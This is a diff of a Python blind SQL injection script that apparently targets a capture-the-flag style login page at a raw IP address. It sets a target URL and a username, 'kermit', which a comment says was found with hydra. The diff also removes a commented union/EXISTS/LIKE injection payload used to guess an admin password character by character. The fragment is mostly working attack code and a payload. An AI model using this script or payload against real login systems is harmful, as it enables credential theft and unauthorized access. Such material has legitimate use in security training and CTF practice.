@@ -6,7 +6,7 @@ characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
 #Sample target
 target = 'http://35.227.24.107:5001/0d9019e4b7/login'
 #Sample parameters
-username = 'kermit'
+username = 'kermit'  //i  have found the username using hydra, but you can use this script to crack the guess too
 password_length = 10
 sleepTime = 0
 requestTimeOut = 10
@@ -15,7 +15,6 @@ if r.status_code != requests.codes.ok:
         raise ValueError('Sorry! We cannot connect the site...')
 else:
         print 'Connection OK! We can go now...'
-    #    `1'union select'1' AND EXISTS(SELECT * FROM admins WHERE username='${foundUser}' AND password LIKE '${currentPass}%')'`
 #FatalityPunction
 def letBlind ():
     foundChars = ''
